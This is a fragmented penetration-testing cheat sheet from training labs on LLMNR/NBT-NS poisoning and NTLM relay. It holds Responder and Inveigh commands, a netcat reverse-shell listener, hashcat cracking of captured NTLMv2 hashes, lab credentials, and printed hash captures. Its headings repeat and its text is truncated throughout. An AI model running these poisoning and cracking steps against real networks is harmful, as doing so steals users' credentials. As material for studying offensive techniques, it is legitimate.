# Responder / NTLM relay

% responder, ntlmrelayx, mitm, cpts

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - dont-forget-to-try-standalone-responder-on-compromised-machine-and-be-
#cat/ATTACK/MITM #cpts
*** We can also abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4). The most common tool to perform such o

```
responder -I
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - dont-forget-to-try-standalone-responder-on-compromised-machine-and-be--2
#cat/ATTACK/MITM #cpts
The NTLMv2 hash was cracked. The password is P@ssword. If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder MultiRelay.py. Let us see an exampl

```
cat /etc/responder/Responder.conf | grep 'SMB ='
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - create-a-reverseshellhttpswwwrevshellscom
#cat/ATTACK/MITM #cpts
On our machine

```
nc -lvnp 9001
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - if-no-gui-tcpdumpresponder
#cat/ATTACK/MITM #cpts
If we are on a host without a GUI (which is typical), we can use [tcpdump](https://linux.die.net/man/8/tcpdump), [net-creds](https://github.com/DanMcInerney/net-creds), and [NetMiner](https://www.netminer.com/en/product/

```
sudo tcpdump -i $interface
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - if-no-gui-tcpdumpresponder-2
#cat/ATTACK/MITM #cpts
![1f6418fa8c2642f6eda7f63362d83af5.png](:/b4f81fac0c9a468b955501cc596cfdcf)

```
sudo responder -I $interface -A
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responder
#cat/ATTACK/MITM #cpts
```
responder -h
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responder-2
#cat/ATTACK/MITM #cpts
```
Usage: responder -I eth0 -w -r -f
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responder-3
#cat/ATTACK/MITM #cpts
```
responder -I eth0 -wrf
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responder-4
#cat/ATTACK/MITM #cpts
```
b, --basic Return a Basic HTTP authentication. Default: NTLM
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responder-5
#cat/ATTACK/MITM #cpts
```
r, --wredir Enable answers for netbios wredir suffix queries.
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responder-6
#cat/ATTACK/MITM #cpts
```
d, --NBTNSdomain Enable answers for netbios domain suffix queries.
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responder-7
#cat/ATTACK/MITM #cpts
```
f, --fingerprint This option allows you to fingerprint a host that
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responder-8
#cat/ATTACK/MITM #cpts
```
w, --wpad Start the WPAD rogue proxy server. Default value is
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responder-9
#cat/ATTACK/MITM #cpts
```
u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responder-10
#cat/ATTACK/MITM #cpts
```
F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responder-11
#cat/ATTACK/MITM #cpts
```
P, --ProxyAuth Force NTLM (transparently)/Basic (prompt)
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responder-12
#cat/ATTACK/MITM #cpts
```
v, --verbose Increase verbosity.
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - starting-responder
#cat/ATTACK/MITM #cpts
```
sudo responder -I $interface
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - starting-responder-2
#cat/ATTACK/MITM #cpts
Code: bash

```
sudo responder -I ens224 -A
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responder-in-action
#cat/ATTACK/MITM #cpts
As shown earlier in the module, the `-A` flag puts us into analyze mode, allowing us to see NBT-NS, BROWSER, and LLMNR requests in the environment without poisoning any responses. We must always supply either an interfac

```
UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responder-logs
#cat/ATTACK/MITM #cpts
LLMNR/NBT-NS Poisoning - from Linux

```
Analyzer-Session.log Responder-Session.log
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - starting-responder-with-default-settings
#cat/ATTACK/MITM #cpts
Code: bash

```
sudo responder -I ens224
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - forced-authentication-attacks
#cat/ATTACK/MITM #cpts
When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as fo

```
sudo responder -I ens33
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - forced-authentication-attacks-2
#cat/ATTACK/MITM #cpts
When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as fo

```
FTP server [ON]
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - forced-authentication-attacks-3
#cat/ATTACK/MITM #cpts
When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as fo

```
Responder NIC [tun0]
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - forced-authentication-attacks-4
#cat/ATTACK/MITM #cpts
When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as fo

```
Responder IP [10.10.14.198]
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - forced-authentication-attacks-5
#cat/ATTACK/MITM #cpts
When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as fo

```
Responder Machine Name [WIN-2TY1Z1CIGXH]
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - forced-authentication-attacks-6
#cat/ATTACK/MITM #cpts
When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as fo

```
Responder Domain Name [HF2L.LOCAL]
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - forced-authentication-attacks-7
#cat/ATTACK/MITM #cpts
When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as fo

```
Responder DCE-RPC Port [48162]
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responderinveigh
#cat/ATTACK/MITM #cpts
```
Import-Module .\Inveigh.ps1
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responderinveigh-2
#cat/ATTACK/MITM #cpts
```
(Get-Command Invoke-Inveigh).Parameters
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responderinveigh-3
#cat/ATTACK/MITM #cpts
```
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responderinveigh-4
#cat/ATTACK/MITM #cpts
```
.\Inveigh.exe
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responderinveigh-5
#cat/ATTACK/MITM #cpts
Disable NBT-NS on Windows

```
$regkey =
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responderinveigh-6
#cat/ATTACK/MITM #cpts
Disable NBT-NS on Windows

```
Get-ChildItem $regkey | foreach { Set-ItemProperty -Path
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - responderinveigh-7
#cat/ATTACK/MITM #cpts
Disable NBT-NS on Windows

```
"$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - obtain-a-password-hash-for-a-domain-user-account-that-can-be-leveraged
#cat/ATTACK/MITM #cpts
Subsequently, students need to run `Responder` to try and attempt to steal hashes:

```
sudo responder -I ens224 -wrfv
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - obtain-a-password-hash-for-a-domain-user-account-that-can-be-leveraged-2
#cat/ATTACK/MITM #cpts
```
└──╼ $ sudo responder -I ens224 -wrfv
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - run-responder-and-obtain-a-hash-for-a-user-account-that-starts-with-th
#cat/ATTACK/MITM #cpts
After spawning the target machine, students first need to connect to it with `SSH` using the credentials `htb-student:HTB_@cademy_stdnt!`:

```
ssh htb-student@STMIP
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - run-responder-and-obtain-a-hash-for-a-user-account-that-starts-with-th-2
#cat/ATTACK/MITM #cpts
```
shell-session
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - run-responder-and-obtain-a-hash-for-a-user-account-that-starts-with-th-3
#cat/ATTACK/MITM #cpts
```
└──╼ $sudo responder -I ens224
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - run-responder-and-obtain-an-ntlmv2-hash-for-the-user-wley-crack-the-ha
#cat/ATTACK/MITM #cpts
Then, once captured, students need to save the hash into a file on their workstations:

```
echo "wley::INLANEFREIGHT:34b5da22defa8787:16E73BD834B38699109B701D643FCD39:010100000000000080EEF606B482D801BE3398AC6A162E6F0000000002000800430031004A00520001001E00570049004E002D00410042004A003300350039005100390033003900580004003400570049004E002D00410042004A00330035003900510039003300390058002E00430031004A0052002E004C004F00430041004C0003001400430031004A0052002E004C004F00430041004C0005001400430031004A0052002E004C004F00430041004C000700080080EEF606B482D8010600040002000000080030003000000000000000000000000030000012F579948338E31E73C081A2AF97E62ADD97CADE5F7854FD1B3B64B879B221240A0010000000000000000000
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - run-responder-and-obtain-an-ntlmv2-hash-for-the-user-wley-crack-the-ha-2
#cat/ATTACK/MITM #cpts
Subsequently, students need to use `Hashcat` to crack the hash using the "rockyou.txt.gz" passwords wordlist, utilizing hashmode 5600; students will find out that the plaintext password of the cracked hash is `transporte

```
hashcat -m 5600 -w 3 -O wleyCapturedHash.txt /usr/share/wordlists/rockyou.txt.gz
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - run-responder-and-obtain-an-ntlmv2-hash-for-the-user-wley-crack-the-ha-3
#cat/ATTACK/MITM #cpts
```
└──╼ [★]$ hashcat -m 5600 -w 3 -O wleyCapturedHash.txt /usr/share/wordlists/rockyou.txt.gz
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - run-responder-and-obtain-an-ntlmv2-hash-for-the-user-wley-crack-the-ha-4
#cat/ATTACK/MITM #cpts
```
hashcat (v6.2.6) starting
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - starting-responder-3
#cat/ATTACK/MITM #cpts
Next, start Responder on our attack box and wait for the user to browse the share. If all goes to plan, we will see the user's NTLMV2 password hash in our console and attempt to crack it offline.

```
sudo responder -wrf -v -I tun0
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - starting-responder-4
#cat/ATTACK/MITM #cpts
Next, start Responder on our attack box and wait for the user to browse the share. If all goes to plan, we will see the user's NTLMV2 password hash in our console and attempt to crack it offline.

```
Responder NIC [tun2]
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - attack-flow
#cat/ATTACK/MITM #cpts
```
Victim sees UNC path → SMB connection fires → NTLMv2 hash sent → Responder captures → Crack offline
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - step-1-start-responder
#cat/ATTACK/MITM #cpts
```
sudo responder -I tun0 -wv
```

## Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - Responder / NTLM relay - fluffy
#cat/ATTACK/MITM #cpts
extrait du PDF Joplin: fluffy

```
sudo responder -I tun0 [SMB] NTLMv2-SSP Client : 10.10.11.69 [SMB] NTLMv2-SSP Username : FLUFFY\p.agila [SMB] NTLMv2-SSP Hash : p.agila::FLUFFY:208d2c2f1ea8dab7:EDA98E265A7A054A8EF2812F9FBB8FE67000000000000000000
```

